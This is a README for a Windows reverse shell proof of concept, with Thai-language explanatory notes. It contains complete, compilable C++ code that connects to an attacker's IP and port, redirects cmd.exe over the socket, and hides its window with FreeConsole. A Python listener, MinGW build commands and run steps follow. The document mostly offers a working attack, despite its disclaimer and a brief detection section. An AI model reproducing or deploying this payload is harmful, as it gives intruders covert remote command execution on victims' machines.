# Win32-ReverseShell-Internal-Research 🛡️💻

A proof-of-concept (PoC) project demonstrating Windows API mechanics, Network Socket programming, and Process I/O redirection using C++. 

> **⚠️ DISCLAIMER: Educational and Research Purposes Only**
> This repository is created strictly for academic research, cybersecurity education, and defensive analysis (Blue Teaming). The author does not condone, encourage, or promote any malicious or illegal activities. Always obtain explicit permission before testing any network or system.

## 📌 Project Overview
This project explores how a reverse shell operates at the OS level on Windows. It demonstrates how to utilize the **Winsock API** to establish a TCP connection and how to hijack the standard input/output streams of a Windows process (`cmd.exe`) using the Win32 API. 

## 🧠 Core Logic & Mechanics (How it Works)
โปรแกรมนี้ทำงานโดยอาศัยหลักการของ Windows API 5 ขั้นตอนหลัก:

1. **Initialize Winsock (`WSAStartup`):** เปิดใช้งานไลบรารีสำหรับการสื่อสารผ่านเครือข่ายของ Windows
2. **Create Socket (`WSASocket`):** สร้างช่องทางการเชื่อมต่อแบบ TCP
3. **Connect to Handler (`WSAConnect`):** สั่งให้ Socket วิ่งชน (Connect) กลับไปยัง IP และ Port ของเครื่องผู้เจาะ (Attacker/Listener)
4. **I/O Redirection (`STARTUPINFO`):** โค้ดจะทำการชี้ (Redirect) ช่องทางรับข้อมูล (Input) และแสดงผล (Output/Error) ของโปรแกรมที่จะรัน ให้วิ่งผ่าน Socket ที่สร้างไว้แทนที่จะแสดงบนหน้าจอ
5. **Spawn Process (`CreateProcessA`):** สั่งรัน `cmd.exe` แบบเงียบๆ 
* **Stealth Mode (`FreeConsole`):** ปลดหน้าต่าง Console ออก ทำให้โปรแกรมรันแบบไม่มีหน้าต่างโผล่ขึ้นมาให้เป้าหมายเห็น

---

## 💻 1. The Payload (C++ Windows Reverse Shell)

Create a file named `reverse_shell.cpp` on your target/development machine:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

void ExecuteReverseShell(const char* ip, int port) {
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // 1. Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    // 2. Create Socket
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    // 3. Connect to Handler (Attacker machine)
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }

    // 4. Redirect CMD Input/Output to Socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    // 5. Spawn Process
    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    // Cleanup 
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
}

int main() {
    // ซ่อนหน้าต่าง Console (Stealth mode)
    FreeConsole(); 
    
    // [!] CHANGE IP AND PORT TO YOUR LISTENER
    ExecuteReverseShell("192.168.1.XX", 4444); 
    
    return 0;
}
```

---

## 🎧 2. The Listener (Python Server)

Create `listener.py` on your attacking/analyzing machine to catch the shell:

```python
import socket

HOST = '0.0.0.0' # Listen on all interfaces
PORT = 4444      # Must match the C++ payload

def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[*] Listening for incoming connections on port {PORT}...")
        
        conn, addr = s.accept()
        with conn:
            print(f"[+] Connection established from target: {addr}")
            while True:
                try:
                    command = input("Target-Shell> ")
                    if command.lower() in ['exit', 'quit']:
                        conn.sendall(b"exit\n")
                        break
                    if command.strip() == "":
                        continue
                        
                    conn.sendall(f"{command}\n".encode())
                    response = conn.recv(4096)
                    print(response.decode(errors='replace'), end='')
                except KeyboardInterrupt:
                    break

if __name__ == "__main__":
    start_listener()
```

---

## ⚙️ Compilation & Execution (Lab Environment)

### Step 1: Start the Listener
On your analyzing/listener machine, run the Python script:
```bash
python3 listener.py
```

### Step 2: Compile the C++ Payload
If using MinGW on Linux or Windows, compile with the `ws2_32` library linked to enable Windows Sockets:
```bash
x86_64-w64-mingw32-g++ reverse_shell.cpp -o shell.exe -lws2_32
```
*(Note: Be sure to change `"192.168.1.XX"` in the C++ code to the IP address of the machine running `listener.py` before compiling).*

### Step 3: Execute
Run `shell.exe` on the target Windows machine. The console window will immediately disappear (thanks to `FreeConsole()`), and you will receive a stealthy remote command prompt on your listener terminal.

---

## 🔍 Detection & Mitigation (Blue Team Perspective)
* **Network Traffic:** Detect unusual outbound TCP connections from background processes.
* **Process Anomalies:** Monitor `cmd.exe` executing without a visible window (`FreeConsole`) or with an unexpected parent process.
* **API Monitoring:** EDRs can hook `CreateProcessA` and flag it if `hStdInput`/`hStdOutput` are assigned to a socket handle.

## 📄 License
MIT License
